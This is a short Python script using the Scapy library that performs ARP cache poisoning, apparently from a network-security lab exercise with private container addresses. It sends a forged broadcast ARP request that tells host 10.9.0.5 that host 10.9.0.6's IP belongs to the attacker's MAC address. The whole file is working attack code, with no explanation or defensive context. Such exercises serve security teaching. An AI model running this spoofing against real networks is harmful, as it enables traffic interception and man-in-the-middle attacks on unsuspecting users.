#!/usr/bin/env python3
from scapy.all import *

A_IP = "10.9.0.5"
A_MAC = "02:42:0a:09:00:05"
B_IP = "10.9.0.6"
M_MAC = "02:42:0a:09:00:69"


E = Ether(dst='ff:ff:ff:ff:ff:ff')
A = ARP(op=1,
          psrc=B_IP,
          hwsrc=M_MAC,
          pdst=A_IP)


pkt = E / A
sendp(pkt)
